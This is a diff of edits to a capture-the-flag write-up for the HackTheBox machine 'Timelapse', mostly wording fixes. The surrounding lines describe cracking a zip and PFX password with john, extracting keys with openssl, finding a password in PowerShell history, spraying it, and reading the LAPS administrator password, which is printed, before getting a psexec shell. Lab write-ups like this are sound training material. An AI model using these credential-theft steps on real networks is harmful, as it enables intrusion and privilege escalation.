@@ -112,7 +112,7 @@ Archive:  winrm_backup.zip
 [winrm_backup.zip] legacyy_dev_auth.pfx password: 
 
 ```
-We attempt to unzip the backup archive and discover that it's password protected by `legacyy_dev_auth.pfx` password. This may be a hint, but let's see if we can snag it with `john`
+We attempt to unzip the backup archive and discover that it's password protecting `legacyy_dev_auth.pfx`. This may be a hint; let's see if we can snag it with `john`
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
@@ -218,17 +218,7 @@ thuglegacy       (legacyy_dev_auth.pfx)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-We once again can rely on `john` to help us crack `legacyy's` password via `pfx2john` to create a hash format useable by `jtr`. It cracks after some time with the password for user `legacyy.`
-
-```zsh
-┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
-└─$ nxc smb dc01.timelapse.htb -u "legacyy@timelapse.htb" -p 'thuglegacy' --shares
-SMB         10.129.136.179  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.136.179  445    DC01             [+] timelapse.htb\legacyy@timelapse.htb:thuglegacy (Guest)
-SMB         10.129.136.179  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
-```
-As you can see we successfully login to the DC as `legacyy` who has Guest privileges on this server. However, when attempting to enumerate shares we are denied access. Let's see if this will let us pull other information. It doesn't.
-
+We once again can rely on `john` to help us crack `legacyy's` PFX file password via `pfx2john` to create a hash format useable by `jtr`. It cracks after some time with the password for the file.`
 #### Extracting certificates from PFX for use in WinRM session
 ```zsh
 kali@kali:~/CTF/HTB/timelapse/files$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes 
@@ -321,7 +311,7 @@ Mode                LastWriteTime         Length Name
 -ar---       10/21/2026   8:21 PM             34 user.txt
 
 ```
-We then pass each key `legacyy.crt` for the public key and `legacyy.key` for the private and successfully login to the DC as `legacyy` and find our `user.txt` sitting in their Desktop folder.
+We then pass each key: `legacyy.crt` for the public key and `legacyy.key` for the private and successfully login to the DC as `legacyy` and find our `user.txt` sitting in their Desktop folder.
 
 ## Privilege Escalation
 ### Leaked Credentials (Powershell History)
@@ -340,7 +330,7 @@ get-aduser -filter * -properties *
 exit
 
 ```
-checking the powershell history we find a plaintext password is hidden inside. Let's get a list of users to spray this with.
+Checking the powershell history we find a plaintext password is hidden inside. Let's get a list of users to spray this with.
 
 ```zsh
 *Evil-WinRM* PS C:\Users\legacyy\Documents> net user
@@ -382,7 +372,7 @@ distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
 ms-Mcs-AdmPwd: HG0vZ3rb+7-B0w+{a8c{Z0+{
 ms-Mcs-AdmPwdExpirationTime: 13437544930220203
 ```
-Pulling `bloodhound` loot we can see that our user has the `ReadLAPSPassword` attribute which is pretty self-explanatory as to it's meaning. We successfully read out the LAPS password for the DC using `bloodyad`. This password is the plaintext password for `Administrator` on the server. Pwned.
+Pulling `bloodhound` loot we can see that our user has the `ReadLAPSPassword` attribute which is pretty self-explanatory as to it's meaning. We successfully read out the LAPS password for the Administrator using `bloodyad`. This password is the plaintext password for `Administrator` on the server since it's using the `ms-Mcs-AdmPwd` attribute. This let's us know that legacy LAPS is in use and that this value is in plaintext. Pwned.
 
 #### Getting an Admin Shell
 ```zsh
@@ -441,7 +431,7 @@ C:\Users> dir TRX\Desktop
                1 File(s)             34 bytes
                2 Dir(s)   5,459,451,904 bytes free
 ```
-for whatever reason, I couldn't get a shell as `Administrator` with WinRM so I used `psexec` instead and was able to then find `root.txt` sitting in user `TRX's` Desktop folder.
+For whatever reason, I couldn't get a shell as `Administrator` with WinRM so I used `psexec` instead and was able to then find `root.txt` sitting in user `TRX's` Desktop folder.
 
 ## Final Thoughts
 >[!Takeaways]
